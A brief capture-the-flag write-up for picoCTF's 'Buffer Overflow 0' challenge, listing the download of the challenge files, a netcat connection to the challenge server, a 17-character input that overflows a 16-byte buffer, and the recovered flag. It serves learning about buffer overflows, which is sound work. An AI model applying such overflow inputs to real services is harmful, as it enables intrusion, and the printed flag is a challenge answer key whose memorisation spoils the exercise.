#Challenge: Buffer OVerflow 0

#Objective
Figure out how overflow the correct buffer 

#Solution Steps
1. Downloaded all necessary files
    wget https://artifacts.picoctf.net/c/174/vuln
    wget https://artifacts.picoctf.net/c/174/vuln.c
2. Checked contents of directory
    ls
3. Found vuln and vuln.c file, checked contents of file
    nano vuln.c
4. Found vuln function that has a max character limit of 16, connected to running instance of vuln
    nc saturn.picoctf.net 53338
5. Prompted input, input 17 characters of 1 
    11111111111111111
6. Extracted flag from output
    flag: picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}


#Learned
How buffer overflows work and the nature of the vulnerability